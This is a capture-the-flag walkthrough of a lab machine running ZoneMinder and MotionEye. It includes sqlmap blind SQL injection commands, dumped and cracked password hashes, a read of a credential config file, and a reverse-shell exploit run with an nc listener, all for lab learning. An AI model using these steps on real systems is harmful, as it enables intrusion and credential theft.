# Room: CCTV
### Difficulty: Easy

First, I started by scanning the target using:
``` bash
nmap -sC -sV TARGET_IP
```
Result:
``` bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://cctv.htb/
```
Since the website redirects to a domain, I added it to my /etc/hosts file:
``` bash
echo "TARGET_IP cctv.htb" | sudo tee -a /etc/hosts
```
After visiting the website, I discovered that it is running ZoneMinder. I tried the default credentials:
``` html
admin:admin
```
Login was successful.

After logging in, I identified the version as 1.37.63, which is vulnerable to CVE-2024-51482 (Blind SQL Injection).

## CVE-2024-51482 (Blind SQL Injection)
I used the following advisory as a reference:
https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3

To exploit the vulnerability, I used sqlmap:
``` bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
--cookie="ZMSESSID=YOUR_COOKIE" \
--dbs
```
This returned the following databases:
``` bash
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```
I focused on the zm database and enumerated its tables. I assumed there would be a users table, which turned out to be correct.
After further enumeration, I retrieved usernames and bcrypt password hashes:
``` bash
Username    Password
----------------------------------------------
superadmin  $2y$10$cmytVWFRnt1XfqsItsJRVe...
mark        $2y$10$prZGnazejKcuTv5bKNexXO...
admin       $2y$10$t5z8uIT.n9uCdHCNidcLf...
```
After some time, I cracked the password using hashcat -m 3200 for the user mark:
``` bash
mark : opensesame
```
After gaining access to the system, I ran linpeas.sh for enumeration. It revealed an internal web service running on port 8765.

I performed port forwarding to access it locally.
``` bash
ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
```
Upon visiting the web, I found a login panel running MotionEye.

After searching on google where I can find the stored credentials, it is located at /etc/motioneye/motion.conf
``` bash
cat /etc/motioneye/motion.conf
```
``` bash
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```
After logging in, I identified the version as 0.43.1b4, which is vulnerable to CVE-2025-60787 (RCE).

## CVE-2025-60787 (RCE)
I used the following exploit:
https://github.com/gunzf0x/CVE-2025-60787

I started a listener:
``` bash
nc -lvnp 9001
```
Then executed the exploit:
``` bash
python3 CVE-2025-60787.py revshell \
--url "http://127.0.0.1:8765" \
--user "admin" \
--password "989c5a8ee87a0e9521ec81a79187d162109282f0" \
--port 9001
```
This resulted in remote code execution as root.

Finally, I retrieved the flags:
### /home/sa_mark/user.txt
### /root/root.txt


